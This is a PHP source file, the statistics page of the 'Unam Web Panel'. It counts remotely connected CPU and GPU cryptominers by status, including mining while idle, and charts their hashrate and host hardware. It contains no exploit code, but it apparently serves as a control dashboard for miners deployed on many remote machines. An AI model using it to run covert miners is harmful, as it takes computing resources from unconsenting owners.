<?php
/* Made by Unam Sanctam https://github.com/UnamSanctam */
require_once dirname(__DIR__).'/assets/php/security.php';

$stats = ['total' => 0, 'offline' => 0];
$newminers = ['today' => [60 * 60 * 24, 0], '3days' => [60 * 60 * 24 * 3, 0], '7days' => [60 * 60 * 24 * 7, 0], '30days' => [60 * 60 * 24 * 30, 0]];
$gpus = $cpus = $algorithms = $versions = $types = $uqhashCache = [];

$miners = getConn()->query("SELECT ms_uqhash, ms_status, ms_algorithm, ms_version, ms_cpu, ms_gpu, ms_type, ms_creationDate, ms_lastConnection FROM miners")->fetchAll(PDO::FETCH_ASSOC);

foreach ($miners as $miner) {
    $stats['total']++;
    if ($miner['ms_lastConnection'] && (strtotime($currentDate) - strtotime($miner['ms_lastConnection'])) > 3*60) {
        $stats['offline']++;
    } else {
        $stats['status_' . $miner['ms_status']] = ($stats['status_' . $miner['ms_status']] ?? 0) + 1;
    }

    if (!array_key_exists($miner['ms_uqhash'], $uqhashCache)) {
        $uqhashCache[$miner['ms_uqhash']] = true;

        foreach (array_count_values(array_filter(explode(', ', $miner['ms_gpu']))) as $gpu => $count) {
            $gpus[$gpu] = ($gpus[$gpu] ?? 0) + $count;
        }

        foreach (array_count_values(array_filter(explode(', ', $miner['ms_cpu']))) as $cpu => $count) {
            $cpus[$cpu] = ($cpus[$cpu] ?? 0) + $count;
        }
    }

    foreach ($newminers as $key => [$threshold,]) {
        if ($miner['ms_creationDate'] && (strtotime($currentDate) - strtotime($miner['ms_creationDate'])) < $threshold) {
            $newminers[$key][1]++;
        }
    }

    $algorithms[$miner['ms_algorithm']] = ($algorithms[$miner['ms_algorithm']] ?? 0) + 1;
    $versions[$miner['ms_version']] = ($versions[$miner['ms_version']] ?? 0) + 1;
    $type = $miner['ms_type'] == 'xmrig' ? 'CPU Miner' : ($miner['ms_type'] == 'ethminer' ? 'GPU Miner' : $larr['unknown']);
    $types[$type] = ($types[$type] ?? 0) + 1;
}
?><!DOCTYPE html>
<html lang="<?= $langID ?>">
<head>
    <?php include dirname(__DIR__).'/assets/php/styles.php'; ?>
    <title>Unam Web Panel &mdash; <?= $larr['statistics'] ?></title>
</head>
<body class="dark-mode sidebar-mini layout-fixed layout-navbar-fixed layout-footer-fixed">
<div class="wrapper">
    <?php include dirname(__DIR__).'/assets/php/navbar.php'; ?>

    <div class="content-wrapper">
        <div class="content-header">
            <div class="container-fluid">
                <div class="row mb-2">
                </div>
            </div>
        </div>

        <section class="content">
            <div class="container-fluid">
                <div class="main-content">
                    <section class="section">
                        <div class="section-header">
                            <h1><?= $larr['statistics'] ?></h1>
                        </div>
                        <div class="section-body">
                            <div class="row">
                                <?php
                                $minercardsdata = [
                                    [$larr['total'], '', $stats['total']],
                                    [$larr['mining'], 'bg-success', $stats['status_2'] ?? 0],
                                    ["{$larr['mining']} ({$larr['idle']})", 'bg-success', $stats['status_3'] ?? 0],
                                    [$larr['starting'], 'bg-warning', $stats['status_6'] ?? 0],
                                    [$larr['paused'], 'bg-warning', $stats['status_4'] ?? 0],
                                    [$larr['not_enough_free_vram'], 'bg-warning', $stats['status_5'] ?? 0],
                                    [$larr['error'], 'bg-danger', $stats['status_7'] ?? 0],
                                    [$larr['offline'], 'bg-danger', $stats['offline']]
                                ];

                                foreach ($minercardsdata as $miner) { ?>
                                    <div class="col-lg-3 col-md-3 col-sm-6 col-6">
                                        <div class="card <?= $miner[1] ?>">
                                            <div class="card-header">
                                                <h4><?= $miner[0] ?></h4>
                                            </div>
                                            <div class="card-body">
                                                <?= $miner[2] ?>
                                            </div>
                                        </div>
                                    </div>
                                <?php } ?>
                            </div>
                            <div class="row">
                                <?php
                                $datecards = [
                                    ["{$larr['new_miners']} - {$larr['today']}", $newminers['today'][1]],
                                    ["{$larr['new_miners']} - 3 {$larr['days']}", $newminers['3days'][1]],
                                    ["{$larr['new_miners']} - 7 {$larr['days']}", $newminers['7days'][1]],
                                    ["{$larr['new_miners']} - 30 {$larr['days']}", $newminers['30days'][1]]
                                ];

                                foreach ($datecards as $datecard) { ?>
                                    <div class="col-lg-3 col-md-3 col-sm-6 col-6">
                                        <div class="card">
                                            <div class="card-header">
                                                <h4><?= $datecard[0] ?></h4>
                                            </div>
                                            <div class="card-body">
                                                <?= $datecard[1] ?>
                                            </div>
                                        </div>
                                    </div>
                                <?php } ?>
                            </div>
                            <div class="row">
                                <?php
                                $charts = '';
                                if($config['hashrate_history']) {
                                    $minercon = getConn()->query("SELECT COUNT(hr_date) AS online, hr_date FROM hashrate GROUP BY hr_date ORDER BY hr_date");
                                    $minersonline = $minercon->fetchAll(PDO::FETCH_ASSOC);

                                    $minersarr = [];

                                    foreach ($minersonline as $value) {
                                        $minersarr[] = ['x' =>date('Y-m-d H:i:s', $value['hr_date']), 'y' => $value['online']];
                                    }

                                    if ($minersarr) { ?>
                                            <div class="col-md-12">
                                                <div class="card">
                                                    <div class="card-header">
                                                        <h4><?= "{$larr['miners']} ({$larr['online']})" ?></h4>
                                                    </div>
                                                    <div class="card-body chart-miners">
                                                        <canvas class="hook-chart" data-chart-type="miners" data-chart-config='<?= json_encode(['type'=>'line', 'data'=>['datasets'=>[['label'=>"{$larr['miners']} ({$larr['online']})", 'data'=>$minersarr, 'fill'=>true]]], 'options'=>['responsive'=>true, 'maintainAspectRatio'=>false, 'scales'=>['x'=>['type'=>'time', 'max'=>date('Y-m-d H:i:00'), 'min'=>date('Y-m-d H:i:00', strtotime("-30 days")), 'time'=>['minUnit'=>'minute']], 'y'=>['min'=>0]]]]) ?>'></canvas>
                                                    </div>
                                                </div>
                                            </div>
                                <?php }
                                } else {
                                    ?>
                                    <div class="col-md-12">
                                        <div class="card">
                                            <div class="card-header">
                                                <h4><?= "{$larr['miners']} ({$larr['online']})" ?></h4>
                                            </div>
                                            <div class="card-body">
                                                <?= $larr['hashrate_history_disabled'] ?>
                                            </div>
                                        </div>
                                    </div>
                                <?php } ?>
                            </div>
                            <div class="row">
                                <?php
                                $charts = '';
                                if($config['hashrate_history']) {
                                    $hashratecon = getConn()->query("SELECT hr_algorithm, SUM(hr_hashrate) AS hashrate, hr_date FROM hashrate GROUP BY hr_date, hr_algorithm ORDER BY hr_date");
                                    $hashrate = $hashratecon->fetchAll(PDO::FETCH_ASSOC);

                                    if ($hashrate) {
                                        $hashratearr = [];

                                        foreach ($hashrate as $value) {
                                            $hashratearr[$value['hr_algorithm']][] = ['x' =>date('Y-m-d H:i:s', $value['hr_date']), 'y' => $value['hashrate']];
                                        }

                                        foreach ($hashratearr as $key => $value) { ?>
                                            <div class="col-md-3">
                                                <div class="card">
                                                    <div class="card-header">
                                                        <h4><?= "{$larr['total']} {$larr['hashrate']}: ".$base->unam_sanitize($key) ?></h4>
                                                    </div>
                                                    <div class="card-body">
                                                        <canvas class="hook-chart" data-chart-type="hashrate" data-chart-config='<?= json_encode(['type'=>'bar', 'data'=>['datasets'=>[['label'=>$base->unam_sanitize($key), 'data'=>$value, 'fill'=>true]]], 'options'=>['responsive'=>true, 'scales'=>['x'=>['type'=>'time', 'max'=>date('Y-m-d H:i:00'), 'min'=>$value[0]['x'], 'time'=>['minUnit'=>'minute']], 'y'=>['min'=>0]]]]) ?>'></canvas>
                                                    </div>
                                                </div>
                                            </div>
                                    <?php }
                                    }
                                } else {
                                    ?>
                                    <div class="col-md-3">
                                        <div class="card">
                                            <div class="card-header">
                                                <h4><?= $larr['total'].' '.$larr['hashrate'] ?></h4>
                                            </div>
                                            <div class="card-body">
                                                <?= $larr['hashrate_history_disabled'] ?>
                                            </div>
                                        </div>
                                    </div>
                                <?php } ?>
                            </div>
                            <div class="row">
                                <?php
                                $minersPieData = [
                                    $larr['mining']=>['color'=>'#28a745', 'value'=>$stats['status_2'] ?? 0],
                                    "{$larr['mining']} ({$larr['idle']})"=>['color'=>'#28a745', 'value'=>$stats['status_3'] ?? 0],
                                    $larr['starting']=>['color'=>'#f39c12', 'value'=>$stats['status_6'] ?? 0],
                                    $larr['paused']=>['color'=>'#f39c12', 'value'=>$stats['status_4'] ?? 0],
                                    $larr['not_enough_free_vram']=>['color'=>'#f39c12', 'value'=>$stats['status_5'] ?? 0],
                                    $larr['error']=>['color'=>'#e74c3c', 'value'=>$stats['status_7'] ?? 0],
                                    $larr['offline']=>['color'=>'#e74c3c', 'value'=>$stats['offline']]
                                ];
                                ?>
                                <div class="col-md-3">
                                    <div class="card">
                                        <div class="card-header">
                                            <h4><?= $larr['status'] ?></h4>
                                        </div>
                                        <div class="card-body">
                                            <canvas class="hook-chart" data-chart-type="status" data-chart-config='<?= json_encode(['type'=>'pie', 'data'=>['labels'=>array_keys($minersPieData), 'datasets'=>[['data'=>array_column($minersPieData, 'value'), 'backgroundColor'=>array_column($minersPieData, 'color')]]], 'options'=>['responsive'=>true]]) ?>'></canvas>
                                        </div>
                                    </div>
                                </div>
                                <?php
                                $pieCharts = [
                                    [$larr['type'], 'type', array_keys($types), array_values($types)],
                                    ['GPUs', 'gpu', array_keys($gpus), array_values($gpus)],
                                    ['CPUs', 'cpu', array_keys($cpus), array_values($cpus)],
                                    [$larr['algorithm'], 'algorithm', array_keys($algorithms), array_values($algorithms)],
                                    [$larr['version'], 'version', array_keys($versions), array_values($versions)]
                                ];
                                foreach ($pieCharts as $pieChart) { ?>
                                    <div class="col-md-3">
                                        <div class="card">
                                            <div class="card-header">
                                                <h4><?= $pieChart[0] ?></h4>
                                            </div>
                                            <div class="card-body">
                                                <canvas class="hook-chart" data-chart-type="<?= $pieChart[1] ?>" data-chart-config='<?= json_encode(['type'=>'pie', 'data'=>['labels'=>$base->unam_sanitize($pieChart[2]), 'datasets'=>[['data'=>$base->unam_sanitize($pieChart[3])]]], 'options'=>['responsive'=>true]]) ?>'></canvas>
                                            </div>
                                        </div>
                                    </div>
                                <?php } ?>
                            </div>
                        </div>
                    </section>
                </div>
            </div>
        </section>
    </div>

    <?php include dirname(__DIR__).'/assets/php/footer.php'; ?>
</div>
<?php include dirname(__DIR__).'/assets/php/scripts.php'; ?>
</body>
</html>